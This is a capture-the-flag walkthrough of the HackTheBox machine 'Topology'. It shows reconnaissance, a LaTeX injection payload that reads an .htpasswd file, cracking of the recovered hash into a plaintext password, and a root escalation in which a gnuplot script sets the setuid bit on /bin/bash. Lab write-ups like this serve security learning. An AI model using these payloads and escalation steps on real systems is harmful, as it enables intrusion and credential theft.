# Box: Topology
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.73.145 -v -p- -T4```

```
Nmap scan report for 10.129.73.145
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/21%OT=22%CT=1%CU=41382%PV=Y%DS=2%DC=T%G=Y%TM=653424
OS:91%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)SEQ(SP=
OS:106%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=105%TI=Z%CI=Z
OS:%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11
OS:NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE
OS:88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=4
OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O
OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40
OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y
OS:%DFI=N%T=40%CD=S)

Uptime guess: 20.776 days (since Sun Oct  1 01:43:17 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   215.71 ms 10.10.14.1
2   210.92 ms 10.129.73.145

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 21 20:20:49 2023 -- 1 IP address (1 host up) scanned in 993.90 seconds
```
From the scan we have 2 open ports, port 22 which runs ssh and port 80 which runs http. Our enumeration today will be focused on port 80



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5e340e8a-5cd0-4205-879c-a2be90b0a64e)

This looks like a normal webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/97542b33-5dba-434a-b9a8-991f29a0b2f5)

Clicking on that,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/32907fe6-6347-4b90-91c9-fa5355ceb9b0)

Lets add the subdomain ```latex.topology.htb``` to our ```/etc/hosts``` file.

Now, we should be able to access the subdomain

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2cfdd623-abdf-43ee-a9e0-155788fa7a4b)

We have a Latex Equation Generator here. Lets exploit this



# Exploitation

I tried lots of payload before I could find the right one

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/df99ec7d-f75a-4e52-9697-6fa140685edb)

We'll be using this to read the ```.htpasswd``` file. When I did a subdomain enumeration, I found a subdomain ```dev.topology.htb```, this means its file path will be ```/var/www/dev```.

Lets read the file from this path

payload:```$\lstinputlisting{/var/www/dev/.htpasswd}$```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/725d9219-79f8-4be1-a0e5-6bc5244cf0f1)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bc5ec5e1-a447-4cc8-b0df-33c6198923dd)

nice nice, lets decrypt this hash using john

command:```john hash --wordlist=/usr/share/wordlists/rockyou.txt```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/topology]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (?)     
1g 0:00:00:08 DONE (2023-10-31 17:43) 0.1228g/s 122370p/s 122370c/s 122370C/s callel..cabrio97
Use the "--show" option to display all of the cracked passwords reliably
```
Since we have the usernam to be ```vdaisley```, lets ssh into the server

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9fdbe3d2-803a-401f-bbc2-976ca6459db8)

We are in. Lets go ahead and escalate our privileges




# Privilege Escalation

Running the pspy tool

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fd3236fe-12ab-44d4-993a-332a1d52e6bd)

We can see that after the process ```/bin/sh``` we find the ```gnuplot``` directory file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7bc0423c-c07e-4dd6-8afd-96aea7f9fba0)

Since this is a ```/bin/sh``` process lets try to create a ```.sh``` file, that will get executed with this process

command:```echo ‘system “chmod u+s /bin/bash”’ > /opt/gnuplot/vawulence.plt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a45f2e8c-2760-46df-8baf-c489729cf02b)

we'll wait for the process to set the "setuid" permission on the /bin/bash executable

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8ae1836a-71a7-42b3-b4aa-699765295cea)

cool cool, we can spawn root shell by running ```bash -p```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc31b7ad-a392-4619-997a-439f1046f607)

We have successfully pwned this box😎


That will be all for today
<br><br>
[Back To Home](../../index.md)

























